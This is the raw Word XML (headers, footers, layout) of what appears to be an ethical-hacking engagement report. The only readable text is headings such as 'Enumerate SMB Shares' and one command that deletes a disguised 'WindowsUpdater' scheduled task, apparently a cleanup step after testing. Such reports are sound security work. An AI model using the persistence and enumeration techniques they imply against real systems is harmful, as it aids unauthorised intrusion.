                <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
                <w:color w:val="252525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color w:val="252525"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00A76861" w:rsidRDefault="00A76861"/>
    <w:sectPr w:rsidR="00A76861">
      <w:headerReference w:type="default" r:id="rId45"/>
      <w:footerReference w:type="default" r:id="rId46"/>
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="1520" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="32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72E60" w:rsidRDefault="00472E60">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00472E60" w:rsidRDefault="00472E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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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73" type="#_x0000_t75" style="position:absolute;margin-left:-.95pt;margin-top:756.8pt;width:616.8pt;height:35.3pt;z-index:-1902;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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72" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:754.55pt;width:616.75pt;height:35.25pt;z-index:-1901;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shap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1" type="#_x0000_t202" style="position:absolute;margin-left:542.05pt;margin-top:742.75pt;width:18.15pt;height:14pt;z-index:-1900;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="007E35E5" w:rsidRDefault="007E35E5">
                <w:pPr>
                  <w:spacing w:line="260" w:lineRule="exact"/>
                  <w:ind w:left="40"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                </w:pPr>
                <w:r>
                  <w:fldChar w:fldCharType="begin"/>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="4E3A2F"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:instrText xml:space="preserve"> PAGE </w:instrText>
                </w:r>
                <w:r>
                  <w:fldChar w:fldCharType="separate"/>
                </w:r>
                <w:r w:rsidR="009B0B5F">
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:noProof/>
                    <w:color w:val="4E3A2F"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>15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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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4" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:754.55pt;width:616.75pt;height:35.25pt;z-index:-1893;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shap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3" type="#_x0000_t202" style="position:absolute;margin-left:542.05pt;margin-top:742.75pt;width:18.15pt;height:14pt;z-index:-1892;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="007E35E5" w:rsidRDefault="007E35E5">
                <w:pPr>
                  <w:spacing w:line="260" w:lineRule="exact"/>
                  <w:ind w:left="40"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                </w:pPr>
                <w:r>
                  <w:fldChar w:fldCharType="begin"/>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="4E3A2F"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:instrText xml:space="preserve"> PAGE </w:instrText>
                </w:r>
                <w:r>
                  <w:fldChar w:fldCharType="separate"/>
                </w:r>
                <w:r w:rsidR="009B0B5F">
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:noProof/>
                    <w:color w:val="4E3A2F"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>20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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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9" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:754.55pt;width:616.75pt;height:35.25pt;z-index:-1888;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shap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8" type="#_x0000_t202" style="position:absolute;margin-left:542.05pt;margin-top:742.75pt;width:18.15pt;height:14pt;z-index:-1887;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="007E35E5" w:rsidRDefault="007E35E5">
                <w:pPr>
                  <w:spacing w:line="260" w:lineRule="exact"/>
                  <w:ind w:left="40"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                </w:pPr>
                <w:r>
                  <w:fldChar w:fldCharType="begin"/>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="4E3A2F"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:instrText xml:space="preserve"> PAGE </w:instrText>
                </w:r>
                <w:r>
                  <w:fldChar w:fldCharType="separate"/>
                </w:r>
                <w:r w:rsidR="009B0B5F">
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:noProof/>
                    <w:color w:val="4E3A2F"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>32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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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0" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:754.55pt;width:616.75pt;height:35.25pt;z-index:-1879;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shap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543.05pt;margin-top:742.75pt;width:16.15pt;height:14pt;z-index:-1878;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="007E35E5" w:rsidRDefault="007E35E5">
                <w:pPr>
                  <w:spacing w:line="260" w:lineRule="exact"/>
                  <w:ind w:left="20" w:right="-36"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                </w:pPr>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="4E3A2F"/>
                    <w:spacing w:val="1"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>33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72E60" w:rsidRDefault="00472E60">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00472E60" w:rsidRDefault="00472E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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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70" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1899;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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9" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1898;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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8" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1897;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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7" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1896;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shap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6" type="#_x0000_t202" style="position:absolute;margin-left:71pt;margin-top:54.35pt;width:141pt;height:14pt;z-index:-1895;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="007E35E5" w:rsidRDefault="007E35E5">
                <w:pPr>
                  <w:spacing w:line="260" w:lineRule="exact"/>
                  <w:ind w:left="20" w:right="-36"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                </w:pPr>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="1"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>7</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t xml:space="preserve">. </w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="38"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t xml:space="preserve"> </w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>Enu</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-1"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>m</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>erate</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="1"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t xml:space="preserve"> </w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>SMB</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-1"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t xml:space="preserve"> </w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="24"/>
                    <w:szCs w:val="24"/>
                  </w:rPr>
                  <w:t>Shares</w:t>
                </w:r>
              </w:p>
            </w:txbxContent>
          </v:textbox>
          <w10:wrap anchorx="page" anchory="page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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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5" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1894;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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2" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1891;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shape>
      </w:pict>
    </w:r>
  </w:p>
</w:hdr>
</file>

<file path=word/header7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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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1" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1890;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shap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0" type="#_x0000_t202" style="position:absolute;margin-left:125pt;margin-top:54pt;width:266.05pt;height:13.05pt;z-index:-1889;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="007E35E5" w:rsidRDefault="007E35E5">
                <w:pPr>
                  <w:spacing w:line="240" w:lineRule="exact"/>
                  <w:ind w:left="20" w:right="-33"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
                    <w:sz w:val="22"/>
                    <w:szCs w:val="22"/>
                  </w:rPr>
                </w:pPr>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
                    <w:color w:val="CC6600"/>
                    <w:position w:val="2"/>
                    <w:sz w:val="22"/>
                    <w:szCs w:val="22"/>
                  </w:rPr>
                  <w:t>schtasks /delete /tn "Window</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
                    <w:color w:val="CC6600"/>
                    <w:spacing w:val="-1"/>
                    <w:position w:val="2"/>
                    <w:sz w:val="22"/>
                    <w:szCs w:val="22"/>
                  </w:rPr>
                  <w:t>s</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
                    <w:color w:val="CC6600"/>
                    <w:position w:val="2"/>
                    <w:sz w:val="22"/>
                    <w:szCs w:val="22"/>
                  </w:rPr>
                  <w:t>Updater" /f</w:t>
                </w:r>
              </w:p>
            </w:txbxContent>
          </v:textbox>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shape>
      </w:pict>
    </w:r>
  </w:p>
</w:hdr>
</file>

<file path=word/header8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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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7" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1886;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shape>
      </w:pict>
    </w:r>
  </w:p>
</w:hdr>
</file>

<file path=word/header9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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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6" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1885;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shape>
      </w:pict>
    </w:r>
  </w:p>
</w:hdr>
</file>

<file path=word/header10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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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5" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1884;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shap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4" type="#_x0000_t202" style="position:absolute;margin-left:53pt;margin-top:55.15pt;width:302.2pt;height:22.05pt;z-index:-1883;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="007E35E5" w:rsidRDefault="007E35E5">
                <w:pPr>
                  <w:spacing w:line="420" w:lineRule="exact"/>
                  <w:ind w:left="20" w:right="-60"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                </w:pPr>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>Ethical</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-2"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t xml:space="preserve"> </w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>Hac</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-2"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>k</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-1"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>e</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>r Eng</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-2"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>a</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>g</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="2"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>e</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-3"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>m</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>ent</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-2"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t xml:space="preserve"> </w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>Report</w:t>
                </w:r>
              </w:p>
            </w:txbxContent>
          </v:textbox>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shape>
      </w:pict>
    </w:r>
  </w:p>
</w:hdr>
</file>

<file path=word/header1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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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3" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1882;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shape>
      </w:pict>
    </w:r>
  </w:p>
</w:hdr>
</file>

<file path=word/header1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E35E5" w:rsidRDefault="007E35E5">
    <w:pPr>
      <w:spacing w:line="200" w:lineRule="exact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2" type="#_x0000_t75" style="position:absolute;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1881;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
          <v:imagedata r:id="rId1" o:title=""/>
          <w10:wrap anchorx="page" anchory="page"/>
        </v:shap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type="#_x0000_t202" style="position:absolute;margin-left:53pt;margin-top:55.15pt;width:202.85pt;height:22.05pt;z-index:-1880;mso-position-horizontal-relative:page;mso-position-vertical-relative:page" filled="f" stroked="f">
          <v:textbox inset="0,0,0,0">
            <w:txbxContent>
              <w:p w:rsidR="007E35E5" w:rsidRDefault="007E35E5">
                <w:pPr>
                  <w:spacing w:line="420" w:lineRule="exact"/>
                  <w:ind w:left="20" w:right="-60"/>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                </w:pPr>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>Ap</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-1"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>p</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>endix –</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-1"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t xml:space="preserve"> </w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-2"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>A</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
